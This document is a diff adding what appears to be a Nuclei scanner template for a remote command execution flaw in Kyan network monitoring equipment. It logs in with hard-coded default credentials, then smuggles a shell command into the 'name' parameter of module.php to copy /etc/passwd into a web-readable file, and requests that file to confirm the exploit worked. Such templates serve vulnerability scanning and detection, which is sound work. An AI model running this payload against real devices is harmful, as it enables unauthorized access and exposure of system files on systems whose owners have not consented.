@@ -1,0 +1,68 @@
+id: poc-kyan-network-monitoring-module-rce
+info:
+  name: Kyan Network Monitoring Equipment module.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+variables:
+  t1: "{{rand_int(1000,2000)}}"
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user=admin&passwd=admin1234&x=49&y=24
+    extractors:
+      - type: regex
+        name: session_id
+        part: header
+        internal: true
+        regex:
+          - "PHPSESSID=([0-9a-z]+)"
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/index.php"
+  - raw:
+      - |
+        GET /module.php?cmd=delete&name=;cat+/etc/passwd>{{t1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID={{session_id}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "选择文件"
+      - type: word
+        part: body
+        words:
+          - "module"
+  - raw:
+      - |
+        GET /{{t1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
